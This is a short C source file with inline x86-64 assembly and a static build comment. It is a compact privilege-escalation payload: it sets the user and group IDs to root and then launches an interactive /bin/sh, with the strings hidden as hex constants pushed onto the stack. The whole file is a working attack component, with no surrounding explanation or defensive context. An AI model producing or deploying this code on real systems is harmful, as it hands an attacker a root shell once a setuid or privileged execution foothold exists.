// x86_64-linux-musl-gcc shell.c -o shell -static -nostdlib -masm=intel
__attribute__((naked)) int main() {
    asm(".intel_syntax noprefix;"
        // setuid(0);
        "xor rdi, rdi;"
        "mov rax, 105;"
        "syscall;"
        // setgid(0);
        "xor rdi, rdi;"
        "mov rax, 106;"
        "syscall;"
        // char *args[] = { "/bin/sh", "-i", NULL };
        // execve(args[0], args, NULL);
        "xor rax, rax;"
        "mov rbx, 0x692d;"
        "push rbx;"
        "mov rsi, rsp;"
        "mov rbx, 0x68732f6e69622f;"
        "push rbx;"
        "mov rdi, rsp;"
        "push rax;"
        "push rsi;"
        "push rdi;"
        "mov rsi, rsp;"
        "xor rdx, rdx;"
        "mov rax, 59;"
        "syscall;"
        :
        :
        :);
}
